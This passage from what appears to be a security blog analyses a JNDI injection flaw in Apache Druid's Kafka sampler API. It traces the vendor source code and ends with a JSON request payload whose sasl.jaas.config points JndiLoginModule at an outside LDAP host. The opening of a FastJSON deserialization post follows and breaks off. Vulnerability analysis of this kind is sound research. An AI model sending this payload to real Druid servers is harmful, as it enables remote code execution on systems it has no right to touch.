class="hljs-built_in">this</span>.ioConfig = Preconditions.checkNotNull(ingestionSpec.getIoConfig(), <span class="hljs-string">&quot;[spec.ioConfig] is required&quot;</span>);<br><span class="hljs-built_in">this</span>.tuningConfig = ingestionSpec.getTuningConfig();<br><span class="hljs-built_in">this</span>.samplerConfig = samplerConfig == <span class="hljs-literal">null</span> ? SamplerConfig.empty() : samplerConfig;<br><span class="hljs-built_in">this</span>.inputSourceSampler = inputSourceSampler;<br>&#125;<br><span class="hljs-comment">//API接口中sample()调用至此</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SamplerResponse <span class="hljs-title function_">sample</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">final</span> InputSource inputSource;<br><span class="hljs-keyword">final</span> InputFormat inputFormat;<br><span class="hljs-keyword">if</span> (dataSchema.getParser() != <span class="hljs-literal">null</span>) &#123;<br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FirehoseFactoryToInputSourceAdaptor</span>(<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeekableStreamSamplerFirehoseFactory</span>(),<br>      dataSchema.getParser()<br>  );<br>  inputFormat = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  RecordSupplier&lt;PartitionIdType, SequenceOffsetType, RecordType&gt; recordSupplier;<br>  <span class="hljs-comment">//调用至子类KafkaSamplerSpeccreateRecordSupplier()</span><br>  <span class="hljs-keyword">try</span> &#123;<br>    recordSupplier = createRecordSupplier();<br>  &#125;<br>  <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SamplerException</span>(e, <span class="hljs-string">&quot;Unable to create RecordSupplier: %s&quot;</span>, Throwables.getRootCause(e).getMessage());<br>  &#125;<br><br>  inputSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecordSupplierInputSource</span>&lt;&gt;(<br>      ioConfig.getStream(),<br>      recordSupplier,<br>      ioConfig.isUseEarliestSequenceNumber(),<br>      samplerConfig.getTimeoutMs() &lt;= <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : samplerConfig.getTimeoutMs()<br>  );<br>  inputFormat = Preconditions.checkNotNull(<br>      ioConfig.getInputFormat(),<br>      <span class="hljs-string">&quot;[spec.ioConfig.inputFormat] is required&quot;</span><br>  );<br>&#125;<br><br><span class="hljs-keyword">return</span> inputSourceSampler.sample(inputSource, inputFormat, dataSchema, samplerConfig);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-5.png" alt="img"></p><p>org.apache.druid.indexing.kafka.KafkaSamplerSpec继承类SeekableStreamSamplerSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//继承类SeekableStreamSamplerSpec</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaSamplerSpec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SeekableStreamSamplerSpec</span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectMapper objectMapper;<br><br>  <span class="hljs-meta">@JsonCreator</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSamplerSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">      //将 json 中 spec 转换为KafkaSupervisorSpec ingestionSpec属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-keyword">final</span> KafkaSupervisorSpec ingestionSpec,</span><br><span class="hljs-params">      //将 json 中 samplerConfig 转换为SamplerConfig samplerConfig属性</span><br><span class="hljs-params">      <span class="hljs-meta">@JsonProperty(&quot;samplerConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">final</span> SamplerConfig samplerConfig,</span><br><span class="hljs-params">      //值为空注入默认值</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> InputSourceSampler inputSourceSampler,</span><br><span class="hljs-params">      <span class="hljs-meta">@JacksonInject</span> ObjectMapper objectMapper</span><br><span class="hljs-params">  )</span>&#123;<br>    <span class="hljs-comment">//调用父类构造方法  </span><br>    <span class="hljs-comment">//ingestionSpec为 json 中 spec </span><br>    <span class="hljs-built_in">super</span>(ingestionSpec, samplerConfig, inputSourceSampler);<br><br>    <span class="hljs-built_in">this</span>.objectMapper = objectMapper;<br>  &#125;<br><br>  <span class="hljs-comment">//调用至此方法  </span><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">protected</span> KafkaRecordSupplier <span class="hljs-title function_">createRecordSupplier</span><span class="hljs-params">()</span><br>  &#123;<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-keyword">try</span> &#123;<br>      Thread.currentThread().setContextClassLoader(getClass().getClassLoader());<br>      <span class="hljs-comment">//声明map  将ioConfig中数据添加至map</span><br>      <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; props = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(((KafkaSupervisorIOConfig) ioConfig).getConsumerProperties());<br>  <span class="hljs-comment">//向map中插入值</span><br>      props.put(<span class="hljs-string">&quot;enable.auto.commit&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;auto.offset.reset&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>);<br>      props.put(<span class="hljs-string">&quot;request.timeout.ms&quot;</span>, Integer.toString(samplerConfig.getTimeoutMs()));<br>      <span class="hljs-comment">//new KafkaRecordSupplier  </span><br>      <span class="hljs-comment">//proos为前面声明的map   objectMapper   ioConfig为ingestionSpec中ioConfig</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaRecordSupplier</span>(props, objectMapper, ((KafkaSupervisorIOConfig) ioConfig).getConfigOverrides());<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>      Thread.currentThread().setContextClassLoader(currCtxCl);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-6.png" alt="img"></p><p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIngestionSpec ingestionSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;dataSchema&quot;)</span> <span class="hljs-meta">@Nullable</span> DataSchema dataSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;tuningConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorTuningConfig tuningConfig,</span><br><span class="hljs-params">    //spec json中ioConfig为KafkaSupervisorIOConfig ioConfig</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;ioConfig为&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIOConfig ioConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;context&quot;)</span> Map&lt;String, Object&gt; context,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;suspended&quot;)</span> Boolean suspended,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskStorage taskStorage,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskMaster taskMaster,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> IndexerMetadataStorageCoordinator indexerMetadataStorageCoordinator,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> KafkaIndexTaskClientFactory kafkaIndexTaskClientFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> <span class="hljs-meta">@Json</span> ObjectMapper mapper,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> ServiceEmitter emitter,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> DruidMonitorSchedulerConfig monitorSchedulerConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> RowIngestionMetersFactory rowIngestionMetersFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> SupervisorStateManagerConfig supervisorStateManagerConfig</span><br><span class="hljs-params">)</span><br>&#123;<br>  <span class="hljs-built_in">super</span>(<br>      ingestionSchema != <span class="hljs-literal">null</span><br>      ? ingestionSchema<br>      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaSupervisorIngestionSpec</span>(<br>          dataSchema,<br>          ioConfig,<br>          tuningConfig != <span class="hljs-literal">null</span><br>          ? tuningConfig<br>          : KafkaSupervisorTuningConfig.defaultConfig()<br>      ),<br>      context,<br>      suspended,<br>      taskStorage,<br>      taskMaster,<br>      indexerMetadataStorageCoordinator,<br>      kafkaIndexTaskClientFactory,<br>      mapper,<br>      emitter,<br>      monitorSchedulerConfig,<br>      rowIngestionMetersFactory,<br>      supervisorStateManagerConfig<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorIOConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorIOConfig</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;topic&quot;)</span> String topic,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;inputFormat&quot;)</span> InputFormat inputFormat,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;replicas&quot;)</span> Integer replicas,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskCount&quot;)</span> Integer taskCount,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskDuration&quot;)</span> Period taskDuration,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;consumerProperties&quot;)</span> Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-meta">@JsonProperty(&quot;autoScalerConfig&quot;)</span> AutoScalerConfig autoScalerConfig,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;pollTimeout&quot;)</span> Long pollTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;startDelay&quot;)</span> Period startDelay,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;period&quot;)</span> Period period,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;useEarliestOffset&quot;)</span> Boolean useEarliestOffset,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;completionTimeout&quot;)</span> Period completionTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionPeriod&quot;)</span> Period lateMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;earlyMessageRejectionPeriod&quot;)</span> Period earlyMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionStartDateTime&quot;)</span> DateTime lateMessageRejectionStartDateTime,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;configOverrides&quot;)</span> KafkaConfigOverrides configOverrides,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;idleConfig&quot;)</span> IdleConfig idleConfig</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">super</span>(<br>    <span class="hljs-comment">//topic不为空</span><br>    Preconditions.checkNotNull(topic, <span class="hljs-string">&quot;topic&quot;</span>),<br>    inputFormat,<br>    replicas,<br>    taskCount,<br>    taskDuration,<br>    startDelay,<br>    period,<br>    useEarliestOffset,<br>    completionTimeout,<br>    lateMessageRejectionPeriod,<br>    earlyMessageRejectionPeriod,<br>    autoScalerConfig,<br>    lateMessageRejectionStartDateTime,<br>    idleConfig<br>);<br><br><span class="hljs-built_in">this</span>.consumerProperties = Preconditions.checkNotNull(consumerProperties, <span class="hljs-string">&quot;consumerProperties&quot;</span>);<br>Preconditions.checkNotNull(<br>    consumerProperties.get(BOOTSTRAP_SERVERS_KEY),<br>    StringUtils.format(<span class="hljs-string">&quot;consumerProperties must contain entry for [%s]&quot;</span>, BOOTSTRAP_SERVERS_KEY)<br>);<br><span class="hljs-built_in">this</span>.pollTimeout = pollTimeout != <span class="hljs-literal">null</span> ? pollTimeout : DEFAULT_POLL_TIMEOUT_MILLIS;<br><span class="hljs-built_in">this</span>.configOverrides = configOverrides;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.indexing.kafka.KafkaRecordSupplier</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法，代码调用至此构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaRecordSupplier</span><span class="hljs-params">(</span><br><span class="hljs-params">  Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  ObjectMapper sortingMapper,</span><br><span class="hljs-params">  KafkaConfigOverrides configOverrides</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">this</span>(getKafkaConsumer(sortingMapper, consumerProperties, configOverrides));<br>&#125;<br><br><br><span class="hljs-comment">//构造方法中调用至getKafkaConsumer()</span><br><span class="hljs-comment">//sortingMapper  为KafkaSamplerSpec中objectMapper</span><br><span class="hljs-comment">//consumerProperties  为声明的map props  主要数据均在此map中</span><br><span class="hljs-comment">//configOverrides  为KafkaSamplerSpec  KafkaSupervisorIngestionSpec 中ConfigOverrides</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> KafkaConsumer&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; getKafkaConsumer(<br>  ObjectMapper sortingMapper,<br>  Map&lt;String, Object&gt; consumerProperties,<br>  KafkaConfigOverrides configOverrides<br>)<br>&#123;<br><span class="hljs-keyword">final</span> Map&lt;String, Object&gt; consumerConfigs = KafkaConsumerConfigs.getConsumerProperties();<br><span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>Map&lt;String, Object&gt; effectiveConsumerProperties;<br><span class="hljs-comment">//    </span><br><span class="hljs-keyword">if</span> (configOverrides != <span class="hljs-literal">null</span>) &#123;<br>  effectiveConsumerProperties = configOverrides.overrideConfigs(consumerProperties);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  effectiveConsumerProperties = consumerProperties;<br>&#125;<br><span class="hljs-comment">//将 effectiveConsumerProperties 中数据添加至 props 中</span><br>addConsumerPropertiesFromConfig(<br>    props,<br>    sortingMapper,<br>    effectiveConsumerProperties<br>);<br>props.putIfAbsent(<span class="hljs-string">&quot;isolation.level&quot;</span>, <span class="hljs-string">&quot;read_committed&quot;</span>);<br>props.putIfAbsent(<span class="hljs-string">&quot;group.id&quot;</span>, StringUtils.format(<span class="hljs-string">&quot;kafka-supervisor-%s&quot;</span>, IdUtils.getRandomId()));<br>props.putAll(consumerConfigs);<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><span class="hljs-keyword">try</span> &#123;<br>  Thread.currentThread().setContextClassLoader(KafkaRecordSupplier.class.getClassLoader());<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">keyDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;key.deserializer&quot;</span>, <span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">valueDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;value.deserializer&quot;</span>, <span class="hljs-literal">false</span>);<br>  <span class="hljs-comment">//new KafkaConsumer&lt;&gt; props为前端出入数据</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaConsumer</span>&lt;&gt;(props, keyDeserializerObject, valueDeserializerObject);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>  Thread.currentThread().setContextClassLoader(currCtxCl);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-7.png" alt="img"></p><p><img src="/image/kafkadruidimage-8.png" alt="img"></p><p>调用至new KafkaConsumer()</p><p><img src="/image/kafkadruidimage-9.png" alt="img"></p><p>JNDI注入成功（此处DNSLog模拟，真实JNDI注入需可访问JNDI恶意服务器，也需要注意JDK版本现限制）</p><p><img src="/image/kafkadruidimage-10.png" alt="img"></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>精简后payload</p><p>bootstrap.servers 可为任意值</p><p>sasl.jaas.config  值参考上一篇</p><p>topic  不为空</p><p>dataSchema 不为空</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;spec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;ioConfig&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;consumerProperties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;bootstrap.servers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;6.6.6.6:9092&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security.protocol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SASL_SSL&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;sasl.jaas.config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://lc7g01.dnslog.cn\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;topic&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;any&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSchema&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dataSource&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sample&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;timestampSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;!!!_no_such_column_!!!&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;missingValue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1970-01-01T00:00:00Z&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;dimensionsSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;granularitySpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rollup&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJSON反序列化漏洞解析</title>
    <link href="/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、fastjson简介"><a href="#一、fastjson简介" class="headerlink" title="一、fastjson简介"></a>一、fastjson简介</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，项目地址：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><p>简单使用方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj); <br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parse(); <span class="hljs-comment">//解析为JSONObject类型或者JSONArray类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>); <span class="hljs-comment">//JSON文本解析成JSONObject类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">//JSON文本解析成VO.class类</span><br></code></pre></td></tr></table></figure><p>maven地址：<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">https://mvnrepository.com/artifact/com.alibaba/fastjson</a></p><h3 id="1-简单的序列化与反序列化"><a href="#1-简单的序列化与反序列化" class="headerlink" title="1.简单的序列化与反序列化"></a>1.简单的序列化与反序列化</h3><p>编写一个User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> 